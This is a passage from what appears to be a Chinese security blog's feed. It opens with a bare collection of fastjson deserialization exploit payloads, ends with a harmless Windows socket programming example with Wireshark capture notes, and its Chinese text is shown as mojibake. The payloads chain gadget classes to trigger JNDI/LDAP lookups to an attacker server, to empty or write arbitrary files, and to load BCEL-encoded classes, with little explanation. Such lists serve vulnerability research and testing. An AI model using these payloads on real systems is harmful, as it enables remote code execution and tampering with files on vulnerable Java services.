class="punctuation">:</span> <span class="string">&quot;ldap://127.0.0.1:23457/Command8&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>JtaTransactionConfig</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;properties&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java.util.Properties&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;UserTransaction&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ldap://127.0.0.1:23457/Command8&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>JndiObjectFactory</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.apache.shiro.jndi.JndiObjectFactory&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;resourceName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ldap://127.0.0.1:23457/Command8&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>AnterosDBCPConfig</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;br.com.anteros.dbcp.AnterosDBCPConfig&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;metricRegistry&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ldap://127.0.0.1:23457/Command8&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>AnterosDBCPConfig2</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;br.com.anteros.dbcp.AnterosDBCPConfig&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;healthCheckRegistry&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ldap://127.0.0.1:23457/Command8&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>CacheJndiTmLookup</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;jndiNames&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ldap://127.0.0.1:23457/Command8&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>AutoCloseable æ¸…ç©ºæŒ‡å®šæ–‡ä»¶</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.lang.AutoCloseable&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.io.FileOutputStream&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;file&quot;</span><span class="punctuation">:</span><span class="string">&quot;/tmp/nonexist&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;append&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">false</span></span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>AutoCloseable æ¸…ç©ºæŒ‡å®šæ–‡ä»¶</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.lang.AutoCloseable&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.io.FileWriter&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;file&quot;</span><span class="punctuation">:</span><span class="string">&quot;/tmp/nonexist&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;append&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">false</span></span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>AutoCloseable ä»»æ„æ–‡ä»¶å†™å…¥</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;stream&quot;</span><span class="punctuation">:</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.lang.AutoCloseable&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.io.FileOutputStream&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;file&quot;</span><span class="punctuation">:</span><span class="string">&quot;/tmp/nonexist&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;append&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">false</span></span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;writer&quot;</span><span class="punctuation">:</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.lang.AutoCloseable&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;org.apache.solr.common.util.FastOutputStream&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;tempBuffer&quot;</span><span class="punctuation">:</span><span class="string">&quot;SSBqdXN0IHdhbnQgdG8gcHJvdmUgdGhhdCBJIGNhbiBkbyBpdC4=&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;sink&quot;</span><span class="punctuation">:</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;$ref&quot;</span><span class="punctuation">:</span><span class="string">&quot;$.stream&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;start&quot;</span><span class="punctuation">:</span><span class="number">38</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;close&quot;</span><span class="punctuation">:</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.lang.AutoCloseable&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;org.iq80.snappy.SnappyOutputStream&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;out&quot;</span><span class="punctuation">:</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;$ref&quot;</span><span class="punctuation">:</span><span class="string">&quot;$.writer&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>BasicDataSource</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;driverClassName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;true&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;driverClassLoader&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;driverClassName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$$BCEL$$$l$8b$I$A$A$A$A$A$A$A...o$V$A$A&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>HikariConfig</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;com.zaxxer.hikari.HikariConfig&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;metricRegistry&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ldap://127.0.0.1:23457/Command8&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>HikariConfig</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;com.zaxxer.hikari.HikariConfig&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;healthCheckRegistry&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ldap://127.0.0.1:23457/Command8&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>HikariConfig</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;metricRegistry&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ldap://127.0.0.1:23457/Command8&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>HikariConfig</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;healthCheckRegistry&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ldap://127.0.0.1:23457/Command8&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>SessionBeanProvider</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.apache.commons.proxy.provider.remoting.SessionBeanProvider&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;jndiName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ldap://127.0.0.1:23457/Command8&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;Object&quot;</span><span class="punctuation">:</span> <span class="string">&quot;su18&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>JMSContentInterceptor</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.apache.cocoon.components.slide.impl.JMSContentInterceptor&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;parameters&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java.util.Hashtable&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;java.naming.factory.initial&quot;</span><span class="punctuation">:</span> <span class="string">&quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;topic-factory&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ldap://127.0.0.1:23457/Command8&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;namespace&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>ContextClassLoaderSwitcher</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.jboss.util.loading.ContextClassLoaderSwitcher&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;contextClassLoader&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;a&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$$BCEL$$$l$8b$I$A$A$A$A$A$A$AmS$ebN$d4P$...$A$A&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>OracleManagedConnectionFactory</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;oracle.jdbc.connector.OracleManagedConnectionFactory&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;xaDataSourceName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ldap://127.0.0.1:23457/Command8&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>JNDIConfiguration</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.apache.commons.configuration.JNDIConfiguration&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;prefix&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ldap://127.0.0.1:23457/Command8&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;fastjson-ååºåˆ—åŒ–æ¼æ´&quot;&gt;&lt;a href=&quot;#fastjson-ååºåˆ—åŒ–æ¼æ´&quot; class=&quot;headerlink&quot; title=&quot;fastjson ååºåˆ—åŒ–æ¼æ´&quot;&gt;&lt;/a&gt;fastjson ååºåˆ—åŒ–æ¼æ´&lt;/h1&gt;&lt;h2 id=&quot;fastjsonä»‹ç»&quot;&gt;&lt;</summary>
      
    
    
    
    <category term="javaå®‰å…¨" scheme="http://example.com/categories/java%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="javaå®‰å…¨" scheme="http://example.com/tags/java%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>windowsä¸‹socketé€šä¿¡</title>
    <link href="http://example.com/2022/07/31/windows%E4%B8%8Bsocket%E9%80%9A%E4%BF%A1/"/>
    <id>http://example.com/2022/07/31/windows%E4%B8%8Bsocket%E9%80%9A%E4%BF%A1/</id>
    <published>2022-07-31T13:16:50.000Z</published>
    <updated>2022-09-01T00:56:19.248Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">server.c</span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;winsock2.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment (lib, <span class="string">&quot;ws2_32.lib&quot;</span>)  <span class="comment">//åŠ è½½ ws2_32.dll</span></span></span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line"><span class="comment">//åˆå§‹åŒ– DLL</span></span><br><span class="line">WSADATA wsaData;</span><br><span class="line">WSAStartup(MAKEWORD(<span class="number">2</span>, <span class="number">2</span>), &amp;wsaData);</span><br><span class="line"> </span><br><span class="line"><span class="comment">//åˆ›å»ºå¥—æ¥å­—</span></span><br><span class="line">SOCKET servSock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);</span><br><span class="line"> </span><br><span class="line"><span class="comment">//ç»‘å®šå¥—æ¥å­—</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">sockAddr</span>;</span></span><br><span class="line"><span class="built_in">memset</span>(&amp;sockAddr, <span class="number">0</span>, <span class="keyword">sizeof</span>(sockAddr));  <span class="comment">//æ¯ä¸ªå­—èŠ‚éƒ½ç”¨0å¡«å……</span></span><br><span class="line">sockAddr.sin_family = PF_INET;  <span class="comment">//ä½¿ç”¨IPv4åœ°å€</span></span><br><span class="line">sockAddr.sin_addr.s_addr = inet_addr(<span class="string">&quot;127.0.0.1&quot;</span>);  <span class="comment">//å…·ä½“çš„IPåœ°å€</span></span><br><span class="line">sockAddr.sin_port = htons(<span class="number">1234</span>);  <span class="comment">//ç«¯å£</span></span><br><span class="line">bind(servSock, (SOCKADDR*)&amp;sockAddr, <span class="keyword">sizeof</span>(SOCKADDR));</span><br><span class="line"> </span><br><span class="line"><span class="comment">//è¿›å…¥ç›‘å¬çŠ¶æ€</span></span><br><span class="line">listen(servSock, <span class="number">20</span>);</span><br><span class="line"> </span><br><span class="line"><span class="comment">//æ¥æ”¶å®¢æˆ·ç«¯è¯·æ±‚</span></span><br><span class="line">SOCKADDR clntAddr;</span><br><span class="line"><span class="type">int</span> nSize = <span class="keyword">sizeof</span>(SOCKADDR);</span><br><span class="line">SOCKET clntSock = accept(servSock, (SOCKADDR*)&amp;clntAddr, &amp;nSize);</span><br><span class="line"> </span><br><span class="line"><span class="comment">//å‘å®¢æˆ·ç«¯å‘é€æ•°æ®</span></span><br><span class="line"><span class="type">char</span> *str = <span class="string">&quot;Hello World!&quot;</span>;</span><br><span class="line">send(clntSock, str, <span class="built_in">strlen</span>(str) + <span class="keyword">sizeof</span>(<span class="type">char</span>), <span class="number">0</span>);</span><br><span class="line"> </span><br><span class="line"><span class="comment">//å…³é—­å¥—æ¥å­—</span></span><br><span class="line">closesocket(clntSock);</span><br><span class="line">closesocket(servSock);</span><br><span class="line"> </span><br><span class="line"><span class="comment">//ç»ˆæ­¢ DLL çš„ä½¿ç”¨</span></span><br><span class="line">WSACleanup();</span><br><span class="line"> </span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">client.c</span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;WinSock2.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib, <span class="string">&quot;ws2_32.lib&quot;</span>)  <span class="comment">//åŠ è½½ ws2_32.dll</span></span></span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line"><span class="comment">//åˆå§‹åŒ–DLL</span></span><br><span class="line">WSADATA wsaData;</span><br><span class="line">WSAStartup(MAKEWORD(<span class="number">2</span>, <span class="number">2</span>), &amp;wsaData);</span><br><span class="line"> </span><br><span class="line"><span class="comment">//åˆ›å»ºå¥—æ¥å­—</span></span><br><span class="line">SOCKET sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);</span><br><span class="line"> </span><br><span class="line"><span class="comment">//å‘æœåŠ¡å™¨å‘èµ·è¯·æ±‚</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">sockAddr</span>;</span></span><br><span class="line"><span class="built_in">memset</span>(&amp;sockAddr, <span class="number">0</span>, <span class="keyword">sizeof</span>(sockAddr));  <span class="comment">//æ¯ä¸ªå­—èŠ‚éƒ½ç”¨0å¡«å……</span></span><br><span class="line">sockAddr.sin_family = PF_INET;</span><br><span class="line">sockAddr.sin_addr.s_addr = inet_addr(<span class="string">&quot;127.0.0.1&quot;</span>);</span><br><span class="line">sockAddr.sin_port = htons(<span class="number">1234</span>);</span><br><span class="line">connect(sock, (SOCKADDR*)&amp;sockAddr, <span class="keyword">sizeof</span>(SOCKADDR));</span><br><span class="line"> </span><br><span class="line"><span class="comment">//æ¥æ”¶æœåŠ¡å™¨ä¼ å›çš„æ•°æ®</span></span><br><span class="line"><span class="type">char</span> szBuffer[MAXBYTE] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">recv(sock, szBuffer, MAXBYTE, <span class="literal">NULL</span>);</span><br><span class="line"> </span><br><span class="line"><span class="comment">//è¾“å‡ºæ¥æ”¶åˆ°çš„æ•°æ®</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Message form server: %s\n&quot;</span>, szBuffer);</span><br><span class="line"> </span><br><span class="line"><span class="comment">//å…³é—­å¥—æ¥å­—</span></span><br><span class="line">closesocket(sock);</span><br><span class="line"> </span><br><span class="line"><span class="comment">//ç»ˆæ­¢ä½¿ç”¨ DLL</span></span><br><span class="line">WSACleanup();</span><br><span class="line"> </span><br><span class="line">system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åˆ†åˆ«ç¼–è¯‘server.c&amp;client.cï¼Œå…ˆè¿è¡Œserver.exeåˆ›å»ºserverç«¯ï¼Œåè¿è¡Œclient.exeï¼Œå¯å¾—ç»“æœå¦‚ä¸‹</p><p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220827003042019.png" alt="image-20220827003042019"> </p><p>wiresharkæŠ“åŒ…åˆ†æ</p><p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220827003739852.png" alt="image-20220827003739852"> </p><ol><li><p>æ ¹æ®SYN,ACKæ ‡è¯†å¯ä»¥çœ‹åˆ°serveå’Œclientç«¯ä¸‰æ¬¡æ¡æ‰‹å»ºç«‹TCPè¿æ¥</p></li><li><p>æ ¹æ®PSH,ACKæ ‡è¯†ä»¥åŠLen&#x3D;13å¯ä»¥çœ‹åˆ°serveå’Œclientç«¯è¿›è¡Œæ•°æ®äº¤äº’ï¼Œä¼ è¾“äº†13ä¸ªå­—ç¬¦</p><p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220827004644316.png" alt="image-20220827004644316"> </p></li><li><p>æ ¹æ®FIN,ACKæ ‡è¯†å¯ä»¥çœ‹åˆ°serveå’Œclientç«¯å››æ¬¡æŒ¥æ‰‹ï¼Œæ–­å¼€TCPè¿æ¥</p></li></ol><p>è¿™é‡Œå†ç®€å•å¤ä¹ ä¸€ä¸‹ä¸‰æ¬¡æ¡æ‰‹ï¼Œå››æ¬¡æŒ¥æ‰‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 